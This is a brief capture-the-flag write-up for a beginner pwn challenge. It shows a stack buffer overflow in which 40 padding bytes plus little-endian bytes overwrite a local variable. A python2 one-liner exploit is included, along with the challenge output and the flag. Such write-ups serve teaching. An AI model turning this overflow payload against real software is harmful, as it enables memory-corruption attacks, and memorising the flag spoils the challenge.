## Name - Manipulate

## Description
Can you manipulate the program to give you the flag?

create a `flag.txt` to test locally.

## Solution

Source code was provided - buffer = 40, after this is `number` which is set to `0xdeadbeef`. Target - set number to `0xa0b1c2d3`. 

input =  40*'A' + '\xd3\xc2\xb1\xa0\x00\x00' (LSB 64 bit  - this information can be found if we ran the attached Makefile in local and ran `file` command on the generated binary).  Sample solve

```
python2 -c "print('A'*40+'\xd3\xc2\xb1\xa0')" | ./challenge
Welcome to the first PWN challenge!
If you can change the number to 0xa0b1c2d3, you win!
What's your name?
casual{l0cal_variable_man1pulati0n}
```
